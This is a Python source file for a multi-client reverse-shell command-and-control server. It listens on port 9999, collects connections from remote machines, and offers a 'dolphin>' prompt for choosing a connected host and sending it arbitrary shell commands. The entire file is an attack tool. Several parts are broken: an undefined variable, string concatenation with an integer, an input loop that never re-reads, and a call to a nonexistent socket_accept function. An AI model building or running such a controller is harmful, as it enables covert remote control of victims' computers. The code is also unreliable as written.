import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS=2

JOB_NUMBER=[1,2]  #1== fisrst thread : listening and establishing connections
					#2==second thread : commands and handle connections

queue=Queue()

#every time some connections are made it brings ip_address and connections
all_connections=[]
all_address=[]
#create a socket (connect to computers)
def create_socket():
	try:
		global host
		global port
		global s
		host=""
		port=9999
		s=socket.socket()
	except socket.error as msg:
		print("Socket Creation error :"+str(msg))


#Binding socket and listening for connection

def bind_socket():
	try:
		global host
		global port
		global s

		print("Binding the port :  "+str(port))

		s.bind((host,port)) #value inside it goes as tuple (host,port)
		#it is binding the host and port together

		s.listen(5)  #server should be continously listening to connections
		# 5 : it is the max limit it going to tolerate a bad connection
		#after limit it goes to exception


	except socket.error as msg:
		print("Socket Creation error :"+str(msg)+"\n"+"Retrying....")
		bind_socket()  #recursion ,this technique will try to bind the host and port together again.

#1st Thread Function : Handle connections from multiple clients and saving to list
#closing prev connections when server restart

def accepting_connections():
	for c in all_connections:
		c.close()

	del all_connections[:]
	del all_address[:]

	while True:
		try:
			conn,add=s.accept()
			s.setblocking(1)  #prevents timeout 
			all_connections.append(conn)
			all_address.append(add)
			print("Connection has been established : "+str(add[0]))

		except:
			print("Error accepting connections")


#2nd thread function : 1)see all the clients 2)select client  3)send commands to the contacted client

#Interactive prompt fro sending commands

def start_dolphin():
	cmd=input('dolphin> ')
	while True:
		if cmd=='list':
			list_connections()

		elif 'select' in cmd:
			conn=get_target(cmd)
			if conn is not None:
				send_target_commands(conn)

		else:
			print("Command not Recognised")


#Display all active connections

def list_connections():
	result=''
	for i,act in enumerate(all_connections):
		try:
			conn.send(str.encode(''))  #sending dummy data to client
			conn.recv(201480)		#recieves data back
		except:
			del all_connections[i]
			del all_address[i]
			continue

		result="User : "+str(i+1)+" IP : "+str(all_address[i][0])+" PORT : "+str(all_address[i][1]+"\n")

	print("---------CLIENTS------------\n"+result)


#selecting the target

def get_target(cmd):
	try:
		target=cmd.replace('select ','')
		target=int(target)-1
		conn=all_connections[target]
		print("You are now connected to : "+str(all_address[target][0]))
		print(str(target+1)+">",end="")
		return conn

	except:
		print("Selection not valid")
		return None



def send_target_commands(conn):
	while True: #it will send infinite commands and not just one
		try:
			cmd=input() #command
			if cmd == 'quit': #for breaking the connectionjust type quit
				break

			if len(str.encode(cmd))>0: #if some actual command is sent
				conn.send(str.encode(cmd)) #command is sent in encoded byte form
				client_response=str(conn.recv(201480),"utf-8") 
				#all information can't be sent in a whole ,so it is stored in chunks==1024bits
				#conn.recv recieves information from client
				#utf-8 it says information can be converted into string

				print(client_response,end="")
		except:
			print("Error sending commands!!")
			break



#Create worker thread

def create_workers():
	for _ in range(NUMBER_OF_THREADS):
		t=threading.Thread(target=work) #create thread
		t.daemon=True
		t.start()


#do next job that is in the queue (handle connections and send commands)

def work():
	while True:
		x=queue.get()
		if x==1:
			create_socket()
			bind_socket()
			accepting_connections()
		if x==2:
			start_dolphin()

		queue.task_done

#
def create_jobs():
	for x in JOB_NUMBER:
		queue.put(x)

	queue.join()



create_workers()
create_jobs()






















def main():
	create_socket()
	bind_socket()
	socket_accept()

main()



		

